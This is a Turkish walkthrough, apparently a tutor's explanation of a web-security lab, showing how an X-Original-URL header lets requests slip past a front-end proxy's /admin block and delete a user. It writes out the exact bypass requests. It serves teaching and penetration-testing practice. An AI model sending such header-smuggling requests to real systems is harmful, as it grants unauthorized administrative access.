Bu labın mantığı ilk bakışta biraz kafa karıştırıyor çünkü **aynı isteği iki farklı bileşen farklı şekilde yorumluyor.** Asıl zafiyet de buradan kaynaklanıyor.

Bunu baştan, adım adım anlatalım.

---

# 1. Uygulamanın mimarisi

İnternetten gelen istekler doğrudan uygulamaya gitmez.

Çoğu zaman arada bir **Reverse Proxy**, **Load Balancer** veya **WAF** bulunur.

```text
        Kullanıcı
            │
            ▼
   Reverse Proxy / WAF
            │
            ▼
      Web Application
```

Örneğin Nginx, Apache, HAProxy veya Cloudflare gibi.

---

# 2. Güvenlik nerede uygulanıyor?

Bu labda erişim kontrolü uygulamanın içinde değil, **ön taraftaki proxy üzerinde** yapılmış.

Mesela şöyle bir kural düşün.

```text
/admin      → Yasak
/admin/*    → Yasak
```

Yani proxy şunu görürse

```http
GET /admin HTTP/1.1
```

cevap verir:

```http
403 Forbidden
```

İstek uygulamaya bile gitmez.

---

# 3. Ama uygulama başka bir özelliği destekliyor

Bazı frameworkler şu headerları destekler:

```http
X-Original-URL
```

veya

```http
X-Rewrite-URL
```

Bu headerların amacı normalde URL rewrite işlemleridir.

Örneğin proxy şöyle diyebilir:

```http
GET /

X-Original-URL: /products
```

Uygulama bunu

> Aslında kullanıcı /products istemiş.

şeklinde yorumlayabilir.

---

# 4. Sorun burada başlıyor

Proxy sadece ilk satıra bakıyor.

Mesela sen şu isteği gönderiyorsun.

```http
GET / HTTP/1.1
```

Proxy diyor ki

> "/ yasak değil."

ve isteği uygulamaya gönderiyor.

Fakat header da var.

```http
X-Original-URL: /admin
```

Uygulama bunu okuyunca diyor ki

> "Gerçek URL /admin."

Yani iki farklı bileşen iki farklı URL görüyor.

---

## Proxy'nin gördüğü

```text
GET /
```

---

## Uygulamanın gördüğü

```text
GET /admin
```

İşte **Access Control Bypass** tam olarak budur.

---

# 5. Sen labda ne yaptın?

Normalde

```http
GET /admin
```

gönderince

```http
403 Forbidden
```

alıyordun.

Sonra bunu yaptın.

```http
GET / HTTP/2
Host: lab
X-Original-URL: /admin
```

Proxy

```text
/
```

gördü.

Geçirdi.

Uygulama

```text
/admin
```

gördü.

Ve admin panelini açtı.

---

# 6. Admin panelinde ne vardı?

HTML içinde şunu gördün.

```html
<a href="/admin/delete?username=carlos">
Delete
</a>
```

Bu sadece bir link.

Tarayıcı buna tıklayınca aslında şu istek oluşuyor.

```http
GET /admin/delete?username=carlos
```

---

# 7. Bu neden çalışmıyor?

Çünkü yine proxy devreye giriyor.

Proxy bunu görüyor.

```http
GET /admin/delete?username=carlos
```

ve diyor ki

> Yasak.

Sonuç

```http
403 Forbidden
```

---

# 8. Aynı bypass burada da uygulanıyor

Sen bu sefer isteği şöyle değiştirdin.

```http
GET /?username=carlos HTTP/2
Host: lab
X-Original-URL: /admin/delete
```

Proxy ne görüyor?

```text
/
```

İzin veriyor.

---

Uygulama ne görüyor?

```text
/admin/delete
```

ve

```text
username=carlos
```

parametresini de alıyor.

Sonra kullanıcıyı siliyor.

---

# 9. Peki neden 302 geldi?

Sunucu şunu döndürdü.

```http
302 Found
Location: /admin
```

Bu aslında çok normal.

Çünkü kullanıcı silindikten sonra tekrar admin paneline yönlendiriyor.

Birçok framework böyle çalışır.

Mantık şu.

```
Delete User

↓

Silme başarılı

↓

Redirect

↓

/admin
```

---

# 10. Sen neden önce

```
Missing parameter 'username'
```

hatası aldın?

İlk denemende büyük ihtimalle şöyle göndermiştin.

```http
GET /
X-Original-URL: /admin/delete
```

Ama

```
username=carlos
```

yoktu.

Uygulama da dedi ki

```
username eksik
```

Demek ki bypass çalışıyordu.

Sadece parametre eksikti.

---

# 11. Bu zafiyet neden oluşuyor?

Çünkü güvenlik kontrolü ile uygulama **aynı URL'yi kullanmıyor.**

Proxy

```
/
```

görüyor.

Uygulama

```
/admin/delete
```

görüyor.

İkisi farklı düşündüğü için güvenlik tamamen boşa çıkıyor.

---

# 12. Gerçek hayatta bu neden tehlikeli?

Düşün ki şirkette şu endpoint var.

```text
/admin/addAdmin
```

Normal kullanıcı erişemiyor.

Ama sistem bu hataya sahip.

Saldırgan

```http
GET /
X-Original-URL: /admin/addAdmin
```

gönderiyor.

Proxy

```
/
```

diyor.

Uygulama

```
/admin/addAdmin
```

diyor.

Sonuç olarak saldırgan:

* Admin paneline girebilir.
* Kullanıcı silebilir.
* Şifre sıfırlayabilir.
* Yetki yükseltebilir.
* Sunucu ayarlarını değiştirebilir.

---

# Bu labdan çıkarılacak en önemli ders

Bu labın amacı **`X-Original-URL` header'ını ezberletmek değildir.**

Asıl öğretilmek istenen şudur:

> **Erişim kontrolü, isteği yorumlayan tüm bileşenlerde tutarlı şekilde uygulanmalıdır.**

Eğer ön taraftaki proxy bir URL'yi, arka taraftaki uygulama ise farklı bir URL'yi esas alıyorsa, saldırgan bu farktan yararlanarak yetkisiz erişim elde edebilir. Bu yüzden penetrasyon testlerinde admin sayfalarına erişemediğinde yalnızca normal URL'leri denemekle kalmayıp, `X-Original-URL`, `X-Rewrite-URL` gibi yeniden yazma (URL rewrite) mekanizmalarını da test etmek önemlidir. Bu lab, bu tür yanlış yapılandırmaların pratikte nasıl istismar edilebileceğini göstermektedir.
